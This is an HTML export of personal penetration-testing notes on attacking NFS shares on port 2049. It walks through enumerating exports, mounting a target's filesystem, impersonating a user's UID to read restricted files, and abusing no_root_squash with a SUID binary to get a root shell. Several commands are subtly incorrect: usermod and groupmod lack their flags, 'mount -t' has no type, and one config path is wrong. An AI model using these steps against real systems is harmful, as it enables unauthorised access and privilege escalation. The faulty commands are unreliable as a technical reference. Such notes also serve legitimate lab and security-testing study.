<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>2049 - NFS</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Port 2049 - NFS </h1></strong><br />The NFS protocol allows for the sharing of network drivers.<br />A user can access files stored on a remote server by mounting the network share onto their own system.<br /><br /><code>sudo apt install nfs-common</code><br /><br /><strong><h2>## Checklist</h2></strong><br />• Check what&#39;s folders are being shared<br />   ◇ <code>showmount -e 192.168.1.109</code><br /><br />• Mount the filesystem<br /><div class="codebox"><div class="codebox">#&nbsp;Create&nbsp;a&nbsp;temporary&nbsp;directory&nbsp;in&nbsp;/tmp&nbsp;to&nbsp;mount&nbsp;the&nbsp;nfs&nbsp;to<br />mkdir&nbsp;/tmp/nfs1<br />#&nbsp;Mount&nbsp;it<br />mount&nbsp;192.168.1.109:/&nbsp;/tmp/nfs1<br />mount&nbsp;-t&nbsp;192.168.1.109:/&nbsp;/tmp/nfs1</div></div><br /><br />• Access restricted files<br />   ◇ If you mount a folder which contains files or folders only accesible by some user (by UID). You can create locally a user with that UID and using that user you will be able to access the file/folder.<br /><br /><div class="codebox"><div class="codebox">useradd&nbsp;bob<br />usermod&nbsp;1005&nbsp;bob<br />groupmod&nbsp;1005&nbsp;bob<br />su&nbsp;bob<br />#&nbsp;Now&nbsp;browse&nbsp;the&nbsp;NFS&nbsp;share&nbsp;as&nbsp;Bob</div></div><br /><br />• Get a root shell<br />   ◇ If <code>no_root_squash</code> is set, drop a SUID binary to the filesystem, <code>chmod 777</code> it, and execute<br /><br /><strong><h2>## Config files</h2></strong><br />• Configuration files for NFS are stored in:<br />   ◇ <code>/etc/exports</code><br />   ◇ <code>/etc/lib/nfs/xtab</code><br /><br /><strong><h2>## Exploits</h2></strong><br />• <a href="https://resources.infosecinstitute.com/exploiting-nfs-share/">https://resources.infosecinstitute.com/exploiting-nfs-share/</a><br /><br /><strong><h3>### Access Restricted Files</h3></strong><br />A directory on the NFS you mounted has the permissions ‘bob uid:1005&#39;<br />As root, you can&#39;t view it.<br />Only ‘bob’ with a UID of 1005 can view it.<br /><br />To get around this, you can simply create a new user called ‘bob’ and set their UID correctly.<br />Then you can browse the NFS as that user.<br /><code>useradd bob</code><br /><code>usermod 1005 bob</code><br /><code>groupmod 1005 bob</code><br /><code>su bob</code><br /><br /><strong><h3>### Get Root Shell</h3></strong><br />• <code>/etc/exports</code> is the config file for NFS<br />• There&#39;s a config option called <code>root_squash</code><br />   ◇ <code>root_squash</code> will remove root privileges when the share is mounted<br />   ◇ <code>no_root_squash</code> doesn&#39;t remove root privilges (i.e. you can access the filesystem as root)<br />      ▪ Therefore, you can drop a SUID binary to the system and chmod it to make it executable by everyone</div>
</body>
</html>
